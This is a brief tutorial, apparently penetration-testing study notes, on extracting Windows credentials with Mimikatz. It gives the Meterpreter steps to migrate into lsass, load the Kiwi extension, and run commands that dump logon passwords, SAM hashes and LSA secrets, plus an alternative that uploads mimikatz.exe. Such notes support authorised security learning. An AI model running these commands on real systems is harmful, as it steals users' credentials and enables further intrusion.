# Dumping Windows Hashes using Mimikatz

- Mimikatz is post exploitation tool used to extract credentials from memory or the password hashes from the local SAM databases,
- SAM is a database in Windows  which stores user passwords
- We can either export the `mimikatz.exe` executable file to the target or use a inbuilt Meterpreter extension called "KIWI" 

#### PRIVILEGE ESCALATION:

1. Gain an initial Meterpreter shell session
2. Now migrate to a privileged process

```
pgrep lsass.exe
migrate "PID"
```

3. Now load the KIWI extension
```
load kiwi
```

4. Now we can run the Mimikatz commands
- `creds_all` 
- `lsa_dump_sam` : dumps the contents of SAM databases
- `lsa_dump_secrets` : dumps Sys keys, LSA keys etc..

5. We can also explort the mimitkatz executable file to the target

```
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

```
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
```
